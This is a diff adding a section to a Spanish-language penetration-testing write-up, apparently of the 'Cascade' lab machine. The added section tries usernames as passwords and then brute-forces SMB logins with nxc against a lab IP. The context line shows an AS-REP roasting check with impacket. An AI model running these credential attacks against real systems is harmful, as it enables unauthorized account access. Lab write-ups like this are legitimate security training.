@@ -66,4 +66,14 @@ impacket-GetNPUsers cascade.local/ -usersfile users.txt -no-pass
 
 Ningún usuario es susceptible a este ataque
 
+### User as Password
+```shell
+nxc smb 10.129.9.250 -u users.txt -p users.txt --no-bruteforce
+```
+
+Ningún usuario utiliza su usuario como contraseña
+Probamos ahora haciendo fuerza bruta
+```shell
+nxc smb 10.129.9.250 -u users.txt -p users.txt
+```
 
